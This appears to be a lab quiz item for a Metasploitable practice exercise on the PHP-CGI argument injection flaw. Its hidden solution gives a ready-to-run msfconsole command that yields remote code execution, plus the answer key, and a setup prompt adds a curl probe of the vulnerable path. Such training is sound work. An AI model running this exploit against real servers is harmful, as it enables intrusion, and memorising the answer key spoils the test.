# Q060 — PHP-CGI Argument Injection

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🔴 Hard |
| **Tools** | `metasploit` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Use msf `exploit/multi/http/php_cgi_arg_injection` against Metasploitable port 80. Report CVE.

---

## 🎯 Flag Format

```
cve=<CVE-YYYY-NNNN>
```

Example: `cve=CVE-2012-1823`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Module exists in Metasploit.
</details>

<details>
<summary>Hint 2</summary>

Old PHP 5.x CGI flaw.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
msfconsole -q -x 'use exploit/multi/http/php_cgi_arg_injection; set RHOSTS 192.168.52.129; set LHOST 192.168.52.128; run'
```

RCE as www-data; CVE-2012-1823.

**Answer:** `cve=CVE-2012-1823`

📖 Ref: [playbooks/exploitation-playbook.md](../../playbooks/exploitation-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q060:
1. Verify Metasploitable2 (192.168.52.129) up; apache2 + php5-cgi running (the /cgi-bin/php path is default).
2. From Parrot: curl -I 'http://192.168.52.129/cgi-bin/php?-s' — must return 200.
3. msfconsole ready; LHOST 192.168.52.128:4444 free.

Report back: "Lab ready for Q060 — php-cgi path accessible on 192.168.52.129".
```
